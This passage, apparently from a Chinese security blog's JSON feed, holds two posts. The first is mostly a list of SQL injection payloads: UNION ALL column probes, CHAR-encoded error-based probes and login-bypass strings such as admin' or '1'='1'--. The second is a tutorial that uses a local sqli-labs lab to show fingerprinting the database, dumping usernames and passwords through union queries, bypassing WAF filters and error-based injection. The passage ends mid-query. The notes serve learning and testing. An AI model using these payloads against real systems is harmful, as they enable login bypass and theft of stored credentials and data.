SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))\n AND 5650=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (5650=5650) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))\n AND 3516=CAST((CHR(113)||CHR(106)||CHR(122)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (3516=3516) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(106)||CHR(107)||CHR(113)) AS NUMERIC)\n AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)\n UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX'\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30\n UNION ALL SELECT 'INJ'||'ECT'||'XXX'-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX'#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#\n</code></pre>\n<h2 id=\"sql-injection-auth-bypass-payloads\"><a class=\"anchor\" href=\"#sql-injection-auth-bypass-payloads\">#</a> SQL Injection Auth Bypass Payloads</h2>\n<pre><code>'-'\n' '\n'&amp;'\n'^'\n'*'\n' or ''-'\n' or '' '\n' or ''&amp;'\n' or ''^'\n' or ''*'\n&quot;-&quot;\n&quot; &quot;\n&quot;&amp;&quot;\n&quot;^&quot;\n&quot;*&quot;\n&quot; or &quot;&quot;-&quot;\n&quot; or &quot;&quot; &quot;\n&quot; or &quot;&quot;&amp;&quot;\n&quot; or &quot;&quot;^&quot;\n&quot; or &quot;&quot;*&quot;\nor true--\n&quot; or true--\n' or true--\n&quot;) or true--\n') or true--\n' or 'x'='x\n') or ('x')=('x\n')) or (('x'))=(('x\n&quot; or &quot;x&quot;=&quot;x\n&quot;) or (&quot;x&quot;)=(&quot;x\n&quot;)) or ((&quot;x&quot;))=((&quot;x\nor 1=1\nor 1=1--\nor 1=1#\nor 1=1/*\nadmin' --\nadmin' #\nadmin'/*\nadmin' or '1'='1\nadmin' or '1'='1'--\nadmin' or '1'='1'#\nadmin' or '1'='1'/*\nadmin'or 1=1 or ''='\nadmin' or 1=1\nadmin' or 1=1--\nadmin' or 1=1#\nadmin' or 1=1/*\nadmin') or ('1'='1\nadmin') or ('1'='1'--\nadmin') or ('1'='1'#\nadmin') or ('1'='1'/*\nadmin') or '1'='1\nadmin') or '1'='1'--\nadmin') or '1'='1'#\nadmin') or '1'='1'/*\n1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055\nadmin&quot; --\nadmin&quot; #\nadmin&quot;/*\nadmin&quot; or &quot;1&quot;=&quot;1\nadmin&quot; or &quot;1&quot;=&quot;1&quot;--\nadmin&quot; or &quot;1&quot;=&quot;1&quot;#\nadmin&quot; or &quot;1&quot;=&quot;1&quot;/*\nadmin&quot;or 1=1 or &quot;&quot;=&quot;\nadmin&quot; or 1=1\nadmin&quot; or 1=1--\nadmin&quot; or 1=1#\nadmin&quot; or 1=1/*\nadmin&quot;) or (&quot;1&quot;=&quot;1\nadmin&quot;) or (&quot;1&quot;=&quot;1&quot;--\nadmin&quot;) or (&quot;1&quot;=&quot;1&quot;#\nadmin&quot;) or (&quot;1&quot;=&quot;1&quot;/*\nadmin&quot;) or &quot;1&quot;=&quot;1\nadmin&quot;) or &quot;1&quot;=&quot;1&quot;--\nadmin&quot;) or &quot;1&quot;=&quot;1&quot;#\nadmin&quot;) or &quot;1&quot;=&quot;1&quot;/*\n1234 &quot; AND 1=0 UNION ALL SELECT &quot;admin&quot;, &quot;81dc9bdb52d04dc20036dbd8313ed055\n</code></pre>\n<h2 id=\"references\"><a class=\"anchor\" href=\"#references\">#</a> References :</h2>\n<ul>\n<li>SQL Injection ( OWASP )</li>\n</ul>\n<p>👉 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9TUUxfSW5qZWN0aW9u\">https://www.owasp.org/index.php/SQL_Injection</span></p>\n<ul>\n<li>Blind SQL Injection</li>\n</ul>\n<p>👉 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9CbGluZF9TUUxfSW5qZWN0aW9u\">https://www.owasp.org/index.php/Blind_SQL_Injection</span></p>\n<ul>\n<li>Testing for SQL Injection (OTG-INPVAL-005)</li>\n</ul>\n<p>👉 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9UZXN0aW5nX2Zvcl9TUUxfSW5qZWN0aW9uXyhPVEctSU5QVkFMLTAwNSk=\">https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OTG-INPVAL-005)</span></p>\n<ul>\n<li>SQL Injection Bypassing WAF</li>\n</ul>\n<p>👉 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9TUUxfSW5qZWN0aW9uX0J5cGFzc2luZ19XQUY=\">https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF</span></p>\n<ul>\n<li>Reviewing Code for SQL Injection</li>\n</ul>\n<p>👉 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9SZXZpZXdpbmdfQ29kZV9mb3JfU1FMX0luamVjdGlvbg==\">https://www.owasp.org/index.php/Reviewing_Code_for_SQL_Injection</span></p>\n<ul>\n<li>PL/SQL:SQL Injection</li>\n</ul>\n<p>👉 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9QTC9TUUw6U1FMX0luamVjdGlvbg==\">https://www.owasp.org/index.php/PL/SQL:SQL_Injection</span></p>\n<ul>\n<li>Testing for NoSQL injection</li>\n</ul>\n<p>👉 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9UZXN0aW5nX2Zvcl9Ob1NRTF9pbmplY3Rpb24=\">https://www.owasp.org/index.php/Testing_for_NoSQL_injection</span></p>\n<ul>\n<li>SQL Injection Injection Prevention Cheat Sheet</li>\n</ul>\n<p>👉 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jaGVhdHNoZWV0c2VyaWVzLm93YXNwLm9yZy9jaGVhdHNoZWV0cy9JbmplY3Rpb25fUHJldmVudGlvbl9DaGVhdF9TaGVldC5odG1s\">https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html</span></p>\n<ul>\n<li>SQL Injection Query Parameterization Cheat Sheet</li>\n</ul>\n<p>👉 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jaGVhdHNoZWV0c2VyaWVzLm93YXNwLm9yZy9jaGVhdHNoZWV0cy9RdWVyeV9QYXJhbWV0ZXJpemF0aW9uX0NoZWF0X1NoZWV0Lmh0bWw=\">https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html</span></p>\n",
            "tags": [
                "sql注入",
                "payload"
            ]
        },
        {
            "id": "https://or0kit.github.io/PenetrationTest/Web-Security/%E5%86%8D%E5%AD%A6SQLinjection/",
            "url": "https://or0kit.github.io/PenetrationTest/Web-Security/%E5%86%8D%E5%AD%A6SQLinjection/",
            "title": "再学SQLinjection",
            "date_published": "2020-12-07T03:27:26.000Z",
            "content_html": "<p><img data-src=\"/images/bimg/%E9%98%BF%E5%B0%94%E7%93%A6%E6%8B%89%E8%BE%9B%EF%BC%8C%E8%A5%BF%E7%8F%AD%E7%89%99.jpg\" alt=\"\" /></p>\n<h1 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h1>\n<blockquote>\n<p>接着深入学习 SQL 注入。本文源自某位前辈的笔记，author：404</p>\n</blockquote>\n<h1 id=\"0x00-注入的产生\"><a class=\"anchor\" href=\"#0x00-注入的产生\">#</a> 0x00 注入的产生</h1>\n<ol>\n<li>\n<p>程序在开发的时候没对用户的数据过滤，把用户的数据都当做可信数据。</p>\n</li>\n<li>\n<p>过滤不严格。</p>\n</li>\n<li>\n<p>数据库配置不当。</p>\n</li>\n<li>\n<p>转义不当。</p>\n</li>\n</ol>\n<h1 id=\"0x01-注入的类型\"><a class=\"anchor\" href=\"#0x01-注入的类型\">#</a> 0x01 注入的类型</h1>\n<p>常见的注入我们可以归纳为数字型，字符型，搜索型，盲注等。</p>\n<pre><code>select * from admin where id = $id; //数字型 注入\n\nselect * from admin where id = '$id'; //字符型\n\nselect * from admin where id = &quot;$id&quot;;\n\nselect * from admin where id = ($id);\n\nselect * from admin where id = ('$id');\n\nselect * from admin where id = (&quot;$id&quot;);\n\nselect * from admin where username  like '%adm%';\n\nselect * from admin where username  like ('%adm%');\n\nselect * from admin where id = $id limit 0,1;\n\nselect * from admin order by $id;\n\nselect * from admin order by limit 0,1 $id;\n\nselect * from admin order by id limit 1,1 $id;\n\ninsert注入\n\nupdate注入\n\ndelete注入\n\n二次注入\n\n等等\n\n</code></pre>\n<p>实际环境中我们可能还会遇到更为复杂的 sql 注入语句，我们就要想办法闭合它。</p>\n<h1 id=\"0x03-寻找注入的一些注意\"><a class=\"anchor\" href=\"#0x03-寻找注入的一些注意\">#</a> 0x03 寻找注入的一些注意</h1>\n<p>如何寻找注入是一门艺术，黑盒测试它建立在对每个参数的 fuzz 上，当然如果你有开发经验，拿到一套程序就能敏锐的发现注入，<br />\n但凡涉及到用户交换地方都将是注入的重灾区，所以你可以适当的学习一下开发。</p>\n<ol>\n<li>\n<p>当网站为成熟的 cms 框架时不建议直接黑盒注入，可以直接审计源码，或者搜索漏洞。</p>\n</li>\n<li>\n<p>判断为自己开发的系统，目标不是很重要可以尝试使用 AWVS 等工具。</p>\n</li>\n<li>\n<p>信息收集的重要性，可能它的源码就在 GitHub 上，或者一个备份文件。</p>\n</li>\n</ol>\n<h1 id=\"0x00-数据库版本收集与路径\"><a class=\"anchor\" href=\"#0x00-数据库版本收集与路径\">#</a> 0x00 数据库版本收集与路径</h1>\n<p>识别数据库版本有助于我们进一步对数据库进行注入我们可以用到  <code>version()</code>   <code>@@version</code>   <code>/*!版本号*/</code></p>\n<p><code>/*!*/</code>  意为在 xxx 版本之上执行 我的版本是 5.6 所以可以执行</p>\n<pre><code>mysql&gt; SELECT * FROM admin WHERE id = 1 union select 1,version(),3;\n+------+----------+----------+\n| id   | username | password |\n+------+----------+----------+\n|    1 | admin    | admin    |\n|    1 | 5.6.30-1 | 3        |\n+------+----------+----------+\n2 rows in set (0.00 sec)\n\nmysql&gt; SELECT * FROM admin WHERE id = 1 union select 1,@@version,3;\n+------+----------+----------+\n| id   | username | password |\n+------+----------+----------+\n|    1 | admin    | admin    |\n|    1 | 5.6.30-1 | 3        |\n+------+----------+----------+\n2 rows in set (0.01 sec)\n\nmysql&gt; SELECT * FROM admin WHERE id = 1 union select 1,/*!40000 user()*/,3;\n+------+----------------+----------+\n| id   | username       | password |\n+------+----------------+----------+\n|    1 | admin          | admin    |\n|    1 | root@localhost | 3        |\n+------+----------------+----------+\n2 rows in set (0.00 sec)\n\n</code></pre>\n<p>路径的话一般用 <code>@@datadir</code>  就可以了然后大概反猜下网站路径 操作系统  <code>@@version_compile_os</code></p>\n<h1 id=\"0x01-用户链接信息\"><a class=\"anchor\" href=\"#0x01-用户链接信息\">#</a> 0x01 用户，链接信息</h1>\n<p><code>system_user()</code>  // 系统用户名<br />\n <code>user()</code>  // 用户名<br />\n <code>current_user()</code>  // 当前用户名<br />\n <code>session_user()</code>  // 链接数据库的用户名</p>\n<pre><code>mysql&gt; select * from users where id =1 union select system_user(),session_user(),current_user();\n+--------------------+--------------------+----------+\n| id                 | username           | password |\n+--------------------+--------------------+----------+\n| 1                  | Dumb               | Dumb     |\n| root@192.168.1.101 | root@192.168.1.101 | root@%   |\n+--------------------+--------------------+----------+\n2 rows in set (0.00 sec)\n\n</code></pre>\n<p>读取 host 与 user</p>\n<pre><code>mysql&gt; select * from users where id =1 union select 1,host,user from mysql.user;\n+----+-----------+----------+\n| id | username  | password |\n+----+-----------+----------+\n|  1 | Dumb      | Dumb     |\n|  1 | %         | root     |\n|  1 | 127.0.0.1 | root     |\n|  1 | ::1       | root     |\n|  1 | localhost | root     |\n+----+-----------+----------+\n5 rows in set (0.00 sec)\n\n</code></pre>\n<h1 id=\"0x02-文末\"><a class=\"anchor\" href=\"#0x02-文末\">#</a> 0x02 文末</h1>\n<p>通过以上信息还能大概判断下是不是站库分离之类的</p>\n<h1 id=\"0x00-初识注入-bypass\"><a class=\"anchor\" href=\"#0x00-初识注入-bypass\">#</a> 0x00 初识注入 bypass</h1>\n<p>在 MySQL 里面注入和搭建环境来其实差不多，推荐使用 sqli-labs 来练练手，网上一堆的方法也是我们从学以来用到的</p>\n<p>加引号 报错  <code>and 1=1</code>   <code>and 1=2</code>  然后 SQLmap 一丢有 waf 就凉凉，可能 and 的时候就凉了，所以手工是也算个必修课吧。</p>\n<p>直接用  <code>and 1=1</code>  一类的多属于 数字型注入  <code>select * from admin where id = $id;</code>  被包裹起来的就不行的，所以<br />\n一般要看报错的语句，当然也不是加个引号没报错就没了，具体分很多情况的。（废话多了点顺便讲清楚吧）</p>\n<h1 id=\"0x01-第一个注入\"><a class=\"anchor\" href=\"#0x01-第一个注入\">#</a> 0x01 第一个注入</h1>\n<p>and 是一个逻辑符号 要求两边同时成立，所以 and 这边是什么可以尽情发挥大家的才能 比如 and true=1 ？，为什么要这么写，因为某狗判断的就是 and 这边的字符类型<br />\n大家可以去了解了解 MySQL 隐式转化。</p>\n<pre><code>mysql&gt; select * from users where id = &quot;1&quot; and 1=1;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | Dumb     | Dumb     |\n+----+----------+----------+\n1 row in set (0.00 sec)\n\nmysql&gt; select * from users where id = &quot;1&quot; and 1=2;\nEmpty set (0.00 sec)\n\n</code></pre>\n<p>说了这么多我们就拿 sqli-labs 的第一关来演示一下</p>\n<p><img data-src=\"1.6.1.png\" alt=\"mysql\" /></p>\n<p>看到报错语句</p>\n<pre><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1\n\n</code></pre>\n<p>其中 <code>''1'' LIMIT 0,1'</code>  最外层的是它出错给你的字符串不用看，所以为 <code>'1'' LIMIT 0,1</code>  应为我们的单引号没闭合所以造成了出错 同时知道了 它的后面有个  <code>LIMIT 0,1</code>  所以反推大概的语句为  <code>select x,x from xxx where x='id' limit 0,1</code>  看到报错信息我们应该要能反推它的语句，有利于我们进一步注入，下面使用联合注入。</p>\n<p>首先都是老套路  <code>order by xx</code>  来判断它的列数，因为  <code>order by</code>  是根据列来排序的 （排序第几列）</p>\n<pre><code>http://127.0.0.1/sqli/Less-1/?id=-2' union select 1,schema_name,3 from information_schema.schemata limit 2,1 -- +\n\n</code></pre>\n<p>通过 limit 0,1 来控制前端的显位的数据 (从第 0 条取一条) 如果是过滤逗号 。 想用分页可以使用  <code>1 offset 1</code>  意思是从第 1 条开始选一条当然还有 join 分页这些都在后面讲了。</p>\n<pre><code>http://127.0.0.1/sqli/Less-1/?id=-2' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' -- +\n</code></pre>\n<p>当然你想直接爆当前的库的表 不妨这样写  <code>table_schema=database()</code>  为了避免单引号你也可以使用 hex 后的数据  <code>table_schema=0x7365637572697479</code></p>\n<p>使用 <code>group_concat()</code>  函数把表名都聚合起来，更加方便。</p>\n<pre><code>http://127.0.0.1/sqli/Less-1/?id=-2' union select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x7573657273 -- +\n</code></pre>\n<p>爆出字段</p>\n<pre><code>http://127.0.0.1/sqli/Less-1/?id=-2' union select 1,group_concat(username,0x7C,password),3 from users-- +\n\n</code></pre>\n<p>爆出数据 在  <code>group_concat()</code>  被过滤的情况下我们可以使用其他的来替换 推荐大家查阅 mysql 函数表</p>\n<p>当我们使用  <code>information_schema.schemata</code>  时被拦截了，我们可以这样绕过</p>\n<pre><code>\n`information_schema`.`schemata `\ninformation_schema/**/.schemata\ninformation_schema/*!*/.schemata\ninformation_schema%0a.schemata\n\n</code></pre>\n<p>也有人遇到过这种情况 users 表被拦截 怎么绕过呢，其实也一样</p>\n<pre><code>security.users 数据库名 加表名\n\nsecurity.`users`\n\n</code></pre>\n<h1 id=\"0x00-报错注入\"><a class=\"anchor\" href=\"#0x00-报错注入\">#</a> 0x00 报错注入</h1>\n<p>报错注入在我们不能联合注入的时候也是非常重要的网上给我们提供了很多中报错注入 这里直接引用<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vd29jYWxpZXNoZW5tZWd1aS9wLzU5MTc5NjcuaHRtbA==\"> https://www.cnblogs.com/wocalieshenmegui/p/5917967.html</span> 一文了</p>\n<pre><code>1.floor()\n\nselect * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);\n\n\n2.extractvalue()\n\nselect * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));\n\n\n3.updatexml()\n\nselect * from test where id=1 and (updatexml(1,concat(0x7e,(select 